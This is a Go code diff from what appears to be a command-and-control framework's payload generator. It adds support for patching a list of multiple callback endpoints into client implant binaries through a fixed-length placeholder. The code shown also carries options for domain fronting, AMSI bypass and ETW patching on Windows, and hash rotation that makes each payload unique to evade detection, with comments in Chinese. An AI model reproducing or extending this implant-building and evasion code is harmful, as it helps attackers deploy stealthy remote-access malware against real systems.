@@ -7,10 +7,10 @@ import (
 	"BackendTemplate/pkg/stager"
 	"BackendTemplate/pkg/utils/logx"
 	"bytes"
-	"fmt"
 	"crypto/rand"
 	"debug/elf"
 	"encoding/binary"
+	"fmt"
 	"io/fs"
 	"strconv"
 	"strings"
@@ -21,6 +21,12 @@ import (
 type BinaryFinder func(listenerType, osType, archType string) (fileName string, data []byte, err error)
 
 // PatchOptions for client binary placeholder replacement
+// MultiEndpointsPlaceholder 多传输端点列表占位符（512 字节，与客户端
+// core/config/multi.go 的 MultiEndpoints 必须逐字节一致）。
+// 用计算而不是手写字面量：手写 486 个 0 数错一个，替换就会"未命中模板"。
+var MultiEndpointsPlaceholder = "MULTI_ENDPOINTS_PLACEHOLDER_" +
+	strings.Repeat("0", 512-len("MULTI_ENDPOINTS_PLACEHOLDER_"))
+
 type PatchOptions struct {
 	ListenerConfig string // protocol://connectAddress
 	OS             string
@@ -29,7 +35,10 @@ type PatchOptions struct {
 	VKey           string
 	EncryptSalt    string
 	FrontHost      string // B8: 域前置/CDN 回源 Host（可选；空则不覆盖客户端 Host 头）
-	JitterPercent  string // client.jitter（0-50），可选；空则保持占位符原样
+	// Endpoints 多传输端点列表（"scheme://addr,scheme://addr"，可选）。
+	// 非空时要求模板是多传输构建（含 512 字节定长占位符），等长替换写入。
+	Endpoints     string
+	JitterPercent string // client.jitter（0-50），可选；空则保持占位符原样
 	// 主机层对抗（Windows）：ETW Patch / AMSI Bypass / syscall 模式
 	ETWPatch    string // "1"=启用（默认）
 	AmsiBypass  string // "1"=启用（默认）
@@ -321,6 +330,15 @@ func PatchClientBinary(binaryData []byte, opt PatchOptions) ([]byte, error) {
 		if err := replaceOrErr(hostPh, []byte(newStr)); err != nil {
 			return nil, err
 		}
+	}
+
+	// 多传输端点列表（仅多传输模板含该占位符；未提供则不动）
+	if opt.Endpoints != "" {
+		patched, perr := patchMultiEndpoints(data, opt.Endpoints)
+		if perr != nil {
+			return nil, perr
+		}
+		data = patched
 	}
 
 	// OPSEC: 二进制 Hash 轮换——每份载荷追加随机长度填充字节，hash 唯一化，
@@ -638,4 +656,21 @@ var _ fs.FS
 // Now helper
 func NowString() string {
 	return time.Now().Format("2006-01-02 15:04:05")
+}
+
+// patchMultiEndpoints 把端点列表写入多传输模板的定长占位符（等长替换）。
+// 单传输模板不含该占位符，调用方只应在生成多传输载荷时调用。
+func patchMultiEndpoints(data []byte, endpoints string) ([]byte, error) {
+	normalized := strings.ReplaceAll(strings.TrimSpace(endpoints), " ", "")
+	if normalized == "" {
+		return data, nil
+	}
+	if len(normalized) > len(MultiEndpointsPlaceholder) {
+		return nil, fmt.Errorf("端点列表过长（%d 字节，上限 %d）", len(normalized), len(MultiEndpointsPlaceholder))
+	}
+	if !bytes.Contains(data, []byte(MultiEndpointsPlaceholder)) {
+		return nil, fmt.Errorf("模板不含多传输端点占位符（请用 multi 模板生成）")
+	}
+	return bytes.ReplaceAll(data, []byte(MultiEndpointsPlaceholder),
+		[]byte(padRight(normalized, len(MultiEndpointsPlaceholder)))), nil
 }
